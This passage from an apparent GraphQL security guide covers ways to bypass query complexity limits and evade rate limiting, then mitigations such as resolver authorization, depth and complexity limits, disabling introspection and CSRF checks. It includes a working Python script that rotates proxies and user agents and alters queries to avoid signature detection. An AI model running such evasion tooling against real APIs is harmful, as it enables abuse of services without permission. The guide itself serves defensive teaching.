       schema {
         types {
           name
         }
       }
     }
     ```

  2. **Bypassing query complexity controls**:
     - Split complex queries into multiple smaller queries
     - Use aliases to perform multiple operations in one query
     - Submit queries in small batches to stay under complexity thresholds
     - Identify and target endpoints with different complexity limits
     - Use fragments to make queries appear simpler
     - Example of splitting a complex query:
     ```graphql
     # Original query that might hit complexity limits
     {
       users(first: 100) {
         edges {
           node {
             id
             posts {
               edges {
                 node {
                   id
                   comments {
                     edges {
                       node {
                         id
                         author {
                           id
                           name
                         }
                       }
                     }
                   }
                 }
               }
             }
           }
         }
       }
     }
     
     # Split into multiple queries
     query GetUsers {
       users(first: 100) {
         edges {
           node {
             id
           }
         }
       }
     }
     
     query GetPosts($userId: ID!) {
       user(id: $userId) {
         posts {
           edges {
             node {
               id
             }
           }
         }
       }
     }
     
     query GetComments($postId: ID!) {
       post(id: $postId) {
         comments {
           edges {
             node {
               id
               author {
                 id
                 name
               }
             }
           }
         }
       }
     }
     ```

  3. **Evading rate limiting**:
     - Distribute requests across multiple IP addresses
     - Use different request patterns to avoid triggering rate limiting
     - Combine multiple operations in a single request using aliases
     - Send requests at irregular intervals to avoid patterns
     - Alternate between different query variations
     - Example Python script for distributed requests:
     ```python
     import requests
     import time
     import random
     
     def evade_rate_limiting(url, query, iterations=100):
         headers = {"Content-Type": "application/json"}
         proxies = [
             # List of different proxies to distribute requests
             {"http": "http://proxy1.example.com:8080", "https": "http://proxy1.example.com:8080"},
             {"http": "http://proxy2.example.com:8080", "https": "http://proxy2.example.com:8080"},
             {"http": "http://proxy3.example.com:8080", "https": "http://proxy3.example.com:8080"}
         ]
         
         # User agent rotation
         user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
         ]
         
         success_count = 0
         
         for i in range(iterations):
             # Select random proxy and user agent
             proxy = random.choice(proxies)
             agent = random.choice(user_agents)
             custom_headers = headers.copy()
             custom_headers["User-Agent"] = agent
             
             # Add some randomization to the query to avoid signature detection
             # For example, add random whitespace or comments
             modified_query = query.replace("\n", "\n" + " " * random.randint(0, 4))
             
             try:
                 response = requests.post(
                     url, 
                     headers=custom_headers, 
                     json={"query": modified_query},
                     proxies=proxy,
                     timeout=10
                 )
                 
                 if response.status_code == 200:
                     success_count += 1
                 
                 # Randomized delay between requests
                 time.sleep(random.uniform(1.0, 3.5))
                 
                 # Occasional longer pause to reset rate limiting
                 if i % 10 == 0:
                     time.sleep(random.uniform(5.0, 8.0))
                     
             except Exception as e:
                 print(f"Error on request {i+1}: {str(e)}")
                 time.sleep(2)
         
         print(f"Completed {iterations} requests with {success_count} successes")
         return success_count
     
     # Example usage
     query = """
     {
       user(id: "1") {
         id
         username
         email
       }
     }
     """
     
     evade_rate_limiting("https://target.com/graphql", query)
     ```

- **Prevention and mitigation**
  1. **Proper authentication and authorization**:
     - Implement strong authentication for all GraphQL endpoints
     - Apply authorization checks at the resolver level
     - Use a permission system for different types of operations
     - Validate user permissions before executing queries
     - Implement proper session management
     - Example authorization check in resolver:
     ```javascript
     // Example GraphQL resolver with authorization
     const resolvers = {
       Query: {
         user: (parent, args, context) => {
           // Check if user is authenticated
           if (!context.user) {
             throw new Error("Authentication required");
           }
           
           // Check if user has permission to view the requested user
           if (args.id !== context.user.id && !context.user.isAdmin) {
             throw new Error("Not authorized to view this user");
           }
           
           return getUserById(args.id);
         }
       }
     };
     ```

  2. **Input validation and sanitization**:
     - Validate all arguments against a schema
     - Use parameterized queries for database operations
     - Implement proper input sanitization
     - Avoid passing user input directly to system commands
     - Validate IDs and ensure ownership
     - Example input validation:
     ```javascript
     // Example input validation in a GraphQL resolver
     const resolvers = {
       Mutation: {
         createPost: (parent, args, context) => {
           // Validate input
           if (!args.title || args.title.length < 3 || args.title.length > 100) {
             throw new Error("Title must be between 3 and 100 characters");
           }
           
           if (args.content && args.content.length > 10000) {
             throw new Error("Content exceeds maximum length");
           }
           
           // Sanitize input to prevent injection
           const sanitizedTitle = sanitizeHtml(args.title);
           const sanitizedContent = sanitizeHtml(args.content);
           
           return createNewPost({
             title: sanitizedTitle,
             content: sanitizedContent,
             authorId: context.user.id
           });
         }
       }
     };
     ```

  3. **Rate limiting and query complexity analysis**:
     - Implement rate limiting based on user/IP
     - Use query complexity analysis to reject expensive queries
     - Set maximum query depth to prevent nested query attacks
     - Limit query aliases to prevent brute force attacks
     - Set timeout limits for query execution
     - Example configuration:
     ```javascript
     // Example Apollo Server configuration with rate limiting and query complexity
     const server = new ApolloServer({
       typeDefs,
       resolvers,
       validationRules: [
         // Limit query depth
         depthLimit(5),
         
         // Limit query complexity
         createComplexityLimitRule(1000, {
           scalarCost: 1,
           objectCost: 2,
           listFactor: 10
         })
       ],
       plugins: [
         // Rate limiting plugin
         {
           requestDidStart() {
             return {
               didResolveOperation({ request, document }) {
                 const rateLimiter = getRateLimiter(request.context.user.id);
                 if (!rateLimiter.check()) {
                   throw new Error("Rate limit exceeded");
                 }
               }
             };
           }
         }
       ]
     });
     ```

  4. **Disabling introspection in production**:
     - Turn off introspection in production environments
     - Implement an environment-specific configuration
     - Provide schema documentation through other channels
     - Use schema directives to hide sensitive fields
     - Example configuration to disable introspection:
     ```javascript
     // Example Apollo Server configuration to disable introspection
     const server = new ApolloServer({
       typeDefs,
       resolvers,
       introspection: process.env.NODE_ENV !== 'production',
       playground: process.env.NODE_ENV !== 'production'
     });
     ```

  5. **Implementing proper error handling**:
     - Use generic error messages in production
     - Avoid exposing implementation details in errors
     - Log detailed errors server-side
     - Implement custom error formatting
     - Example error handling:
     ```javascript
     // Example error formatting in Apollo Server
     const server = new ApolloServer({
       typeDefs,
       resolvers,
       formatError: (error) => {
         // Log the detailed error server-side
         console.error('GraphQL Error:', error);
         
         // Return generic error to client in production
         if (process.env.NODE_ENV === 'production') {
           return new Error('An error occurred while processing your request');
         }
         
         // In development, can return more details
         return error;
       }
     });
     ```

  6. **CSRF protection**:
     - Accept only application/json content type
     - Validate content-type header
     - Implement CSRF tokens for mutations
     - Use proper CORS configuration
     - Example CSRF protection middleware:
     ```javascript
     // Example Express middleware for GraphQL CSRF protection
     app.use('/graphql', (req, res, next) => {
       // Only allow POST requests
       if (req.method !== 'POST') {
         return res.status(405).send('Method not allowed');
       }
       
       // Check Content-Type header
       const contentType = req.headers['content-type'] || '';
       if (!contentType.includes('application/json')) {
         return res.status(415).send('Unsupported Media Type');
       }
       
       // For mutations, validate CSRF token
       if (req.body && req.body.query && req.body.query.includes('mutation')) {
         const csrfToken = req.headers['x-csrf-token'];
         if (!csrfToken || !validateCsrfToken(req.session, csrfToken)) {
           return res.status(403).send('CSRF token validation failed');
         }
       }
       
       next();
     });
     ```

  7. **Secure deployment practices**:
     - Use HTTPS for all communications
     - Apply proper network segmentation
     - Implement monitoring and alerting
     - Regular security testing and code reviews
     - Keep GraphQL libraries updated
     - Example secure server configuration:
     ```javascript
     // Example secure Express + Apollo Server setup
     import express from 'express';
     import { ApolloServer } from 'apollo-server-express';
     import helmet from 'helmet';
     import rateLimit from 'express-rate-limit';
     
     const app = express();
     
     // Security headers
     app.use(helmet());
     
     // Parse JSON requests only
     app.use(express.json());
     
     // Global rate limiting
     app.use(rateLimit({
       windowMs: 15 * 60 * 1000, // 15 minutes
       max: 100 // limit each IP to 100 requests per windowMs
     }));
     
     // CORS configuration
     app.use(cors({
       origin: 'https://trusted-client.com',
       methods: 'POST',
       credentials: true
     }));
     
     // GraphQL server
     const server = new ApolloServer({
       typeDefs,
       resolvers,
       context: ({ req }) => {
         // Authentication logic
         const token = req.headers.authorization || '';
         const user = validateToken(token);
         return { user };
       },
       introspection: false,
       playground: false
     });
     
     await server.start();
     server.applyMiddleware({ 
       app,
       cors: false // We already configured CORS
     });
     
     // Start HTTPS server
     https.createServer({
       key: fs.readFileSync('server.key'),
       cert: fs.readFileSync('server.cert')
     }, app).listen(443, () => {
       console.log('Server running on https://localhost:443/graphql');
     });
     ```
